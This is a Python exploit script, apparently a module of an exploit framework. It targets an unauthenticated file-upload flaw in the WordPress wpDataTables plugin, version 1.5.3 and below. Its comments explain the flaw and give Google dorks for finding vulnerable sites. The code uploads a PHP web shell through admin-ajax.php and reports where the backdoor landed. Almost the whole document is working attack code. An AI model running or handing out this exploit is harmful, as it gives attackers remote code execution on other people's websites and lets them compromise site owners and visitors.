#!/usr/bin/python
#
# Exploit Name: Wordpress wpDataTables 1.5.3 and below Unauthenticated Shell Upload Vulnerability
#
# Vulnerability discovered by Claudio Viviani
#
# Date : 2014-11-22
#
# Exploit written by Claudio Viviani
#
# Exploit modified by Andres O'Brien
#
# Video Demo: https://www.youtube.com/watch?v=44m4VNpeEVc
#
# --------------------------------------------------------------------
#
# Issue n.1 (wpdatatables.php)
#
# This function is always available without wpdatatables edit permission:
#
# function wdt_upload_file(){
# require_once(PDT_ROOT_PATH.'lib/upload/UploadHandler.php');
#        $uploadHandler = new UploadHandler();
#        exit();
#    }
#    ...
#    ...
#    ...
#    add_action( 'wp_ajax_wdt_upload_file', 'wdt_upload_file' );
#    add_action( 'wp_ajax_nopriv_wdt_upload_file', 'wdt_upload_file' );
#
#
# Issue n.2 (lib/upload/UploadHandler.php)
#
# This php script allows you to upload any type of file
#
# ---------------------------------------------------------------------
#
# Dork google:  inurl:/plugins/wpdatatables
#               inurl:codecanyon-3958969
#               index of "wpdatatables"
#               index of "codecanyon-3958969"
#
# Tested on BackBox 3.x

import re
import urllib.request as urllib2
from exploits import exploitshell


class WPDataTables(exploitshell.ExploitShell):
	@staticmethod
	def getexploitname():
		return "wpDataTables v1.5.3"

	@staticmethod
	def getexploit():
		getfields = dict()
		payloadname = 'extras/shell.php'
		payloadcontent = open(payloadname).read()

		LIMIT = '----------lImIt_of_THE_fIle_eW_$'
		CRLF = '\r\n'

		L = []
		for (key, value) in getfields.items():
			L.append('--' + LIMIT)
			L.append('Content-Disposition: form-data; name="%s"' % key)
			L.append('')
			L.append(value)

		L.append('--' + LIMIT)
		L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('files[]', payloadname))
		L.append('Content-Type: application/force-download')
		L.append('')
		L.append(payloadcontent)
		L.append('--' + LIMIT + '--')
		L.append('')
		body = CRLF.join(L)
		return body

	def exploit(self):
		if self.hostname[:8] != "https://" and self.hostname[:7] != "http://":
			self.hostname = 'http://' + self.hostname

		url_wpdatatab_upload = self.hostname + '/wp-admin/admin-ajax.php?action=wdt_upload_file'

		content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

		bodyupload = self.getexploit()

		headers = {
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '
			'Chrome/36.0.1985.125 Safari/537.36',
			'content-type': content_type,
			'content-length': str(len(bodyupload))}


		req = urllib2.Request(url_wpdatatab_upload, bodyupload, headers)

		response = urllib2.urlopen(req)

		read = response.read()

		if "error" in read or read == "0":
			return False
		else:
			backdoor_location = re.compile('\"url\":\"(.*?)\",\"').search(read).group(1)
			return "[!] Shell Uploaded \r\n [!] Location: " + backdoor_location.replace("\\", "")

